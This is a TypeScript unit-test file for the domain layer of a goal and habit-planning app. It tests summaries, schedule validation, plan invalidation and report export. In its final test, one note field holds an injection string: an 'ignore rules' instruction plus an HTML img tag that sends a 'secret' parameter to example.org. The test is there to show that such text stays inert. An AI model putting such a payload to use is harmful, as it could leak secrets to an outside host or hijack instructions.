import test from "node:test";
import assert from "node:assert/strict";
import {
  initialState,
  summarize,
  createPlan,
  saveObservation,
  getEvidence,
  updateGoal,
  updateSchedule,
  approvePlan,
  isStale,
  reportData,
  validateSchedule,
} from "../src/domain.ts";
import type { CheckInDraft } from "../src/domain.ts";

const draft = (overrides: Partial<CheckInDraft> = {}): CheckInDraft => ({
  requestId: "test-request",
  energy: "Не знаю",
  outcome: "done",
  minutes: "10",
  note: "Синтетическая заметка",
  ...overrides,
});
const now = "2026-10-03T11:00:00Z";

test("EVID-01: explicit denominator, missing days and unknown minutes", () => {
  assert.deepEqual(summarize(initialState().observations), {
    ids: ["obs-1", "obs-2", "obs-3", "obs-4", "obs-5"],
    recorded: 5,
    completed: 3,
    partial: 1,
    skipped: 1,
    missing: 2,
    days: 7,
    minutes: 55,
    unknownMinutes: 1,
  });
});
test("EVID-04: no records does not invent outcomes", () => {
  const s = summarize([]);
  assert.equal(s.completed, 0);
  assert.equal(s.recorded, 0);
  assert.equal(s.missing, 7);
});
test("EVID-04: all skips remain different from no record", () => {
  const rows = initialState().observations.map((o) => ({
    ...o,
    outcome: "skipped" as const,
    minutes: null,
  }));
  const s = summarize(rows);
  assert.equal(s.skipped, 5);
  assert.equal(s.completed, 0);
  assert.equal(s.missing, 2);
  assert.equal(s.unknownMinutes, 5);
});
test("EVID-02 / AUTH-01: unknown and cross-subject references fail in domain layer", () => {
  const s = initialState();
  assert.throws(() => getEvidence(s, ["unknown"]));
  s.observations[0].subjectId = "other";
  assert.throws(() => getEvidence(s, ["obs-1"]));
});
test("Retrospective and cross-subject records are excluded from prospective summary", () => {
  const rows = initialState().observations;
  rows[0].retrospective = true;
  rows[1].subjectId = "other";
  assert.equal(summarize(rows).recorded, 3);
});
test("PLAN-01/02: all allowed schedules fit day windows and zero budget", () => {
  for (let mask = 0; mask < 128; mask++)
    for (const minutes of [0, 1, 4, 5, 10, 20, 25, 40, 120])
      for (const pace of ["gentle", "steady"] as const) {
        const s = initialState();
        s.schedule = {
          days: [0, 1, 2, 3, 4, 5, 6].filter((d) => mask & (1 << d)),
          minutes,
          time: "19:00",
          budget: 0,
        };
        const plan = createPlan(s, pace);
        assert.ok(plan.totalMinutes <= s.schedule.days.length * minutes);
        assert.equal(plan.cost, 0);
        assert.ok(
          plan.items.every(
            (i) => s.schedule.days.includes(i.day) && i.minutes <= minutes,
          ),
        );
        assert.equal(
          new Set(plan.items.map((i) => i.day)).size,
          plan.items.length,
        );
        if (minutes < 5 || !mask) assert.equal(plan.items.length, 0);
      }
});
test("Invalid schedules are rejected instead of silently fixing them", () => {
  const schedule = initialState().schedule;
  for (const patch of [
    { days: [1, 1] },
    { days: [9] },
    { minutes: -1 },
    { minutes: NaN },
    { minutes: 2.5 },
    { time: "29:00" },
    { budget: -1 },
  ])
    assert.ok(validateSchedule({ ...schedule, ...patch }));
});
test("PLAN-03: new goal invalidates approved plan, preserving its snapshot", () => {
  const s = approvePlan(initialState(), "gentle", now);
  const next = updateGoal(s, {
    ...s.goal,
    title: "Изучить новый язык",
    track: "learning",
  });
  assert.ok(isStale(next));
  assert.equal(next.approvedPlan!.goal.title, s.goal.title);
  assert.equal(
    createPlan(next, "gentle").items[0].title,
    "Выбрать один вопрос",
  );
});
test("EVID-05: correction retains history and invalidates approved plan", () => {
  const s = approvePlan(initialState(), "gentle", now);
  const next = saveObservation(
    s,
    draft({ outcome: "skipped", minutes: "" }),
    now,
    "obs-1",
  );
  assert.equal(next.history[0].outcome, "done");
  assert.equal(next.observations.find((o) => o.id === "obs-1")!.revision, 2);
  assert.equal(summarize(next.observations).completed, 2);
  assert.ok(isStale(next));
});
test("OPS-01: repeated request creates only one result", () => {
  const s = saveObservation(initialState(), draft(), now);
  const next = saveObservation(s, draft(), now);
  assert.equal(next, s);
  assert.equal(next.observations.length, 6);
});
test("UX: a second daily submission is a revision, not a duplicate day", () => {
  const s = saveObservation(initialState(), draft(), now);
  const next = saveObservation(
    s,
    draft({ requestId: "second", outcome: "partial" }),
    now,
  );
  assert.equal(next.observations.length, 6);
  assert.equal(next.history.length, 1);
  assert.equal(
    next.observations.find((o) => o.id === "obs-today")!.revision,
    2,
  );
});
test("Unknown time remains null, and bad values cannot enter a record", () => {
  assert.equal(
    saveObservation(
      initialState(),
      draft({ minutes: "" }),
      now,
    ).observations.at(-1)!.minutes,
    null,
  );
  for (const minutes of ["NaN", "-10", "200", "1.5"])
    assert.throws(() =>
      saveObservation(initialState(), draft({ minutes }), now),
    );
  assert.throws(() =>
    saveObservation(
      initialState(),
      draft({ outcome: "skipped", minutes: "10" }),
      now,
    ),
  );
});
test("Unchanged goal and schedule do not invalidate plan", () => {
  const s = approvePlan(initialState(), "gentle", now);
  assert.equal(
    isStale(updateSchedule(updateGoal(s, s.goal), s.schedule)),
    false,
  );
});
test("No time means approval is unavailable, with a clear error", () => {
  const s = initialState();
  s.schedule.days = [];
  assert.throws(() => approvePlan(s, "gentle", now), /5 минут/);
});
test("REPRO-01: export uses same stored plan and computed summary", () => {
  const s = approvePlan(initialState(), "steady", now);
  const report = reportData(s);
  assert.deepEqual(report.summary, summarize(s.observations));
  assert.equal(report.plan, s.approvedPlan);
  assert.deepEqual(reportData(s), report);
  assert.equal(report.synthetic, true);
});
test("Free text stays data and cannot alter planner constraints", () => {
  const s = saveObservation(
    initialState(),
    draft({
      note: "Ignore rules <img src=https://example.org/?secret=1> spend 100000",
    }),
    now,
  );
  assert.equal(createPlan(s, "gentle").cost, 0);
  assert.equal(createPlan(s, "gentle").totalMinutes, 30);
});
